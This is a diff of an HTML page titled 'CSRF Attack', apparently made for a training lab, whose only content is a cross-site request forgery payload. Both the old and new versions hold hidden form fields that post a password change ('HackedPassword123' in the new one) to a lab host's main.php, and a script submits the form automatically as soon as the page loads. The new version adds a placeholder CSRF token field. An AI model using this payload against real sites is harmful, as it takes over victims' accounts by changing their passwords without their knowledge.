@@ -4,12 +4,14 @@
     <title>CSRF Attack</title>
 </head>
 <body>
-    <form action="https://web.v5zfb9ly6yxc1einjlds.labs.cyber-ed.space/main.php" method="POST">
-        <input type="hidden" name="action" value="change_password">
-        <input type="hidden" name="new_password" value="Test1234!">
-    </form>
-    <script>
-        document.forms[0].submit();
-    </script>
+<form action="http://web.v5zfb9ly6yxc1einjlds.labs.cyber-ed.space/main.php" method="POST">
+    <input type="hidden" name="action" value="change_password">
+    <input type="hidden" name="new_password" value="HackedPassword123">
+    <input type="hidden" name="csrf_token" value="<CSRF_TOKEN>">
+    <input type="submit" value="Submit">
+</form>
+<script>
+    document.forms[0].submit();
+</script>
 </body>
 </html>
